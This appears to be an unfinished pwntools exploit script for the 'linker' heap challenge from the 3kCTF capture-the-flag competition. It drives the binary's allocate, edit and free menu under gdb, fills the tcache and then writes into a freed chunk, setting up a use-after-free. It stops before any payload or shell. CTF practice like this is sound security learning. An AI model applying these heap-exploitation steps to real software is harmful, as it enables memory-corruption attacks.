from pwn import *
gdbscript = """ 
	b * empty_page
	b * edit_page
"""

p = process('./linker')
#p = gdb.debug('/home/noxyproxy/RandomCTF/3kctf/pwn/linker',gdbscript)
pid = gdb.attach(p,gdbscript)

def blank_page(r,size):
	r.recvuntil('> ')
	r.sendline('1')
	r.sendlineafter('Provide page size:\n',str(size))


def edit_page(r,index,content):
	r.recvuntil('> ')
	r.sendline('2')
	r.sendlineafter('Provide page index:\n',str(index))
	r.sendlineafter('Provide new page content:\n',str(content))


def empty_page(r,index):
	r.recvuntil('> ')
	r.sendline('3')
	r.sendlineafter('Provide page index:\n',str(index))

p.sendlineafter('Provide name size:\n','7')
p.sendlineafter('Provide a name:\n','sandi')


for num in range(8):
	blank_page(p,0x128)
	empty_page(p,0)


blank_page(p,0x128)
blank_page(p,0x128)
empty_page(p,0)
edit_page(p,0,'AAAAAAAA')
#p.interactive()
#p.interactive()
#blank_page(p,0x10)
#empty_page(p,0)